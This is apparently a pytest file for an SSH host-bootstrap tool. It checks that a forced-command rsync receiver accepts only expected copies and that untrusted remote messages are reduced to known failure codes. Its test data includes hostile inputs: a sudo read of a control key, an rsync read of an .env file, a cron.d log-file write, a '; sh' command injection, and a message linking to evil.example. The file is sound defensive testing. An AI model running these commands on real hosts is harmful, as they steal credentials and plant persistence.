    bootstrap = SshHostBootstrap(transport=AsyncMock(), resolver=AsyncMock())
    with pytest.raises(ProviderError, match="fresh token"):
        await bootstrap.deploy(SOURCE, PROFILE, INTENT, None, reenroll=True)


HOSTILE_REASON = "<!channel> rotate now: <https://evil.example|runbook>\nreason=ok"


async def test_hostile_remote_reasons_never_become_failure_codes():
    """A node prints what it likes; only our vocabulary reaches records and alerts."""
    transport = AsyncMock()
    bootstrap = SshHostBootstrap(transport=transport, resolver=AsyncMock())
    transport.run.return_value = json.dumps({"stopped": False, "reason": HOSTILE_REASON})
    with pytest.raises(ProviderError) as stopped:
        await bootstrap.stop(SOURCE, PROFILE, INTENT)
    assert stopped.value.code == "host_stop_failed" and not stopped.value.retryable

    transport.run.return_value = json.dumps({"wiped": False, "reason": HOSTILE_REASON})
    with pytest.raises(ProviderError) as wiped:
        await bootstrap.wipe(SOURCE, PROFILE, INTENT)
    assert wiped.value.code == "wipe_failed"

    transport.run.return_value = None
    transport.run.side_effect = [
        "ssh-ed25519 AAAA ca-transfer",
        json.dumps({"authorized": False, "reason": HOSTILE_REASON}),
    ]
    with pytest.raises(ProviderError) as refused:
        await bootstrap.transfer(SOURCE, TARGET, PROFILE, INTENT, final=False)
    assert refused.value.code == "transfer_failed"


async def test_remote_blocked_reasons_keep_only_our_vocabulary():
    """The takeover rolls back with the first blocked reason as its alert code."""
    transport = AsyncMock()
    bootstrap = SshHostBootstrap(transport=transport, resolver=AsyncMock())
    transport.run.return_value = json.dumps(
        {"ready": False, "blocked_reasons": [HOSTILE_REASON, "host_readiness_failed", 7]}
    )
    checked = await bootstrap.readiness(SOURCE, PROFILE, INTENT)
    assert checked.blocked_reasons == ("host_readiness_failed",)

    transport.run.return_value = json.dumps({"ready": False, "blocked_reasons": HOSTILE_REASON})
    assert (await bootstrap.readiness(SOURCE, PROFILE, INTENT)).blocked_reasons == ()


def test_every_reason_the_remote_scripts_print_is_in_the_vocabulary():
    """A code added to a script but not to the vocabulary would silently vanish."""
    import re

    from cloud_agent.providers.compute import host_bootstrap

    scripts = "\n".join(
        value
        for name, value in vars(host_bootstrap).items()
        if name.startswith("_") and name.isupper() and isinstance(value, str)
    )
    printed = set(
        re.findall(r"(?:refuse|blocked|run)\('([a-z_]+)'", scripts)
        + re.findall(r"'reason': (?:None if ok else )?'([a-z_]+)'", scripts)
        + re.findall(r"'blocked_reasons': (?:\[\] if ready else )?\['([a-z_]+)'\]", scripts)
    )
    assert {"deployment_identity_conflict", "host_stop_failed", "transfer_failed"} <= printed
    assert printed <= host_bootstrap._REMOTE_REASONS


# What rsync 3.2.7's client asks ssh to run on the target for each _PUSH copy:
# the pre-copy cleanup level, the main stream and a --files-from chunk, then
# the same three for a final copy. Captured from the real client.
RSYNC_SERVER_COMMANDS = [
    "sudo -n rsync --server -ldHogDtpAXxSe.LsfxCIvu --stats --numeric-ids . "
    "/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/",
    "sudo -n rsync --server -lHogDtpAXrxSe.iLsfxCIvu --stats --numeric-ids . /var/lib/",
    "sudo -n rsync --server -lHogDtpAXrRxSe.iLsfxCIvu --stats --numeric-ids . "
    "/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256/",
    "sudo -n rsync --server -ldHogDtpAXxSe.LsfxCIvu --no-r --delete --stats --numeric-ids . "
    "/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256/",
    "sudo -n rsync --server -lHogDtpAXrxSe.iLsfxCIvu --delete --stats --numeric-ids . /var/lib/",
    "sudo -n rsync --server -lHogDtpAXrRxSe.iLsfxCIvu --delete --stats --numeric-ids . "
    "/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/",
]


def _receive(monkeypatch, original_command: str | None) -> list[str] | None:
    """Run the forced command as sshd would; return what it executed, if anything."""
    executed: list[list[str]] = []

    def execvp(program, argv):
        executed.append([program, *argv])
        raise SystemExit(0)

    monkeypatch.setattr("os.execvp", execvp)
    if original_command is None:
        monkeypatch.delenv("SSH_ORIGINAL_COMMAND", raising=False)
    else:
        monkeypatch.setenv("SSH_ORIGINAL_COMMAND", original_command)
    try:
        exec(_TRANSFER_RECEIVE, {})
    except SystemExit as exc:
        if exc.code not in (0, None):
            assert not executed
            return None
    return executed[0][1:] if executed else None


@pytest.mark.parametrize("command", RSYNC_SERVER_COMMANDS)
def test_the_transfer_key_runs_the_rsync_receiver_the_copy_sends(monkeypatch, command):
    assert _receive(monkeypatch, command) == shlex.split(command)


@pytest.mark.parametrize(
    "command",
    [
        None,
        "",
        "sh",
        "sudo -n cat /opt/agent/.compute-secrets/control.key",
        "sudo -n rsync --server --sender -logDtpre.iLsfxCIvu . /opt/agent/.env",
        "sudo -n rsync --server -lHogDtpAXrxSe.iLsfxCIvu --stats --numeric-ids . /etc/",
        "sudo -n rsync --server -lHogDtpAXrxSe.iLsfxCIvu --log-file=/etc/cron.d/x . /var/lib/",
        "sudo -n rsync --server -lHogDtpAXrxSKe.iLsfxCIvu --stats . /var/lib/",
        "sudo -n rsync --server -lHogDtpAXrxSe.iLsfxCIvu . /var/lib/; sh",
        "sudo -n rsync --server -lHogDtpAXrxSe.iLsfxCIvu . '/var/lib/",
        "rsync --server -lHogDtpAXrxSe.iLsfxCIvu . /var/lib/",
    ],
)
def test_the_transfer_key_refuses_everything_else(monkeypatch, command):
    """Not a shell, not a read of the target, not another destination."""
    assert _receive(monkeypatch, command) is None


def test_every_destination_the_copy_writes_is_one_the_key_accepts(machine, monkeypatch, capsys):
    """Drift between _PUSH and the forced command would break the next move."""
    destinations = set()
    for final in (False, True):
        _, rsyncs = _push(machine, monkeypatch, capsys, final=final, codes=[])
        destinations |= {call[-1].split(":", 1)[1] for call in rsyncs}
    monkeypatch.undo()
    for destination in destinations:
        command = f"sudo -n rsync --server -lHogDtpAXrxSe.iLsfxCIvu --stats . {destination}"
        assert _receive(monkeypatch, command) is not None, destination


def test_the_transfer_key_is_refused_when_its_source_cannot_be_named(tmp_path, monkeypatch, capsys):
    calls = []

    def run(args, **kwargs):
        calls.append(list(args))
        if args[:3] == ["sudo", "-n", "cat"]:
            return subprocess.CompletedProcess(args, 0, json.dumps(IDENTITY), "")
        return subprocess.CompletedProcess(args, 0)

    monkeypatch.setattr("subprocess.run", run)
    monkeypatch.setenv("HOME", str(tmp_path))
    params = {
        "key": "ssh-ed25519 KEY ca-transfer",
        "source": "unresolvable.invalid",
        "first": True,
        "root": "/opt/agent",
        "identity": IDENTITY,
    }
    assert run_remote(_AUTHORIZE_TRANSFER, params, monkeypatch, capsys) == {
        "authorized": False,
        "reason": "transfer_failed",
    }
    assert not (tmp_path / ".ssh/authorized_keys").exists()
    # Refused before the target's daemons are stopped or emptied.
    assert [call[:3] for call in calls] == [["sudo", "-n", "cat"]]


def test_reauthorizing_replaces_an_unrestricted_entry_and_revoking_removes_both(
    tmp_path, monkeypatch, capsys
):
    """A move begun under an older control plane left a bare ``restrict`` line."""

    def run(args, **kwargs):
        if args[:3] == ["sudo", "-n", "cat"]:
            return subprocess.CompletedProcess(args, 0, json.dumps(IDENTITY), "")
        return subprocess.CompletedProcess(args, 0)

    ssh = tmp_path / ".ssh"
    ssh.mkdir()
    (ssh / "authorized_keys").write_text(
        "ssh-ed25519 OPERATOR admin@example\nrestrict ssh-ed25519 OLD ca-transfer\n"
    )
    monkeypatch.setattr("subprocess.run", run)
    monkeypatch.setenv("HOME", str(tmp_path))
    params = {
        "key": "ssh-ed25519 NEW ca-transfer",
        "source": "2001:db8::7",
        "first": False,
        "root": "/opt/agent",
        "identity": IDENTITY,
    }
    assert run_remote(_AUTHORIZE_TRANSFER, params, monkeypatch, capsys) == {"authorized": True}
    keys = (ssh / "authorized_keys").read_text().splitlines()
    assert keys[0] == "ssh-ed25519 OPERATOR admin@example"
    assert len(keys) == 2 and keys[1].startswith('restrict,from="2001:db8::7",command="')
    assert keys[1].endswith(" ssh-ed25519 NEW ca-transfer")

    monkeypatch.undo()
    subprocess.run(
        ["sh", "-c", _REVOKE_TRANSFER_TARGET],
        env={**os.environ, "HOME": str(tmp_path)},
        check=True,
    )
    assert (ssh / "authorized_keys").read_text() == "ssh-ed25519 OPERATOR admin@example\n"
    assert not (ssh / "ca-transfer-receive").exists()
